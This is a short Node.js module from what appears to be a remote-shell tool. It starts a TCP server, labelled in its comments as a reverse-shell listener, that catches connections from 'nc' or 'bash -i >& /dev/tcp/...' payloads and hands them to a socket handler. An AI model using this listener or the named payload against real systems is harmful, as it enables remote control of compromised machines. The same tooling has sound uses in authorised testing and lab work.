import net from "node:net";
import config from "../config.js";
import { handleSocket } from "./socket-transport.js";

// Raw TCP reverse-shell listener. Any `nc`/`bash -i >& /dev/tcp/...` payload
// lands here.
export function startTcp() {
  if (!config.ENABLE_TCP) return null;

  const server = net.createServer((socket) => {
    socket.setNoDelay(true);
    handleSocket(socket, "tcp");
  });

  server.on("error", (err) => {
    console.error(`[tcp] listener error: ${err.message}`);
  });

  server.listen(config.TCP_PORT, config.HOST, () => {
    console.log(`[tcp]  reverse-shell listener on ${config.HOST}:${config.TCP_PORT}`);
  });

  return server;
}
